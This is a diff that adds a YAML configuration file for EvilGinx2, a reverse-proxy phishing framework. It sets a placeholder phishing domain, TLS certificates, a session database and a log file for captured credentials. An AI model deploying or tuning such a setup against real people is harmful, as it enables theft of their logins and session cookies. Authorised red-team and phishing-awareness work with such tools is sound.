@@ -1,0 +1,26 @@
+# EvilGinx2 Main Configuration
+version: 3.4.1-mod
+server:
+  ip: 0.0.0.0
+  port: 443
+  domain: your-phishing-domain.com
+  use_ssl: true
+  ssl_cert: /etc/evilginx/ssl/fullchain.pem
+  ssl_key: /etc/evilginx/ssl/privkey.pem
+
+logging:
+  level: info
+  access_log: /var/log/evilginx/access/evilginx.access.log
+  error_log: /var/log/evilginx/error/evilginx.error.log
+  capture_log: /var/log/evilginx/captures/credentials.log
+
+database:
+  type: sqlite
+  path: /var/lib/evilginx/sessions/evilginx.db
+  max_connections: 100
+
+security:
+  rate_limit: 100
+  ban_time: 3600
+  allowed_ips: []
+  blocked_ips: []
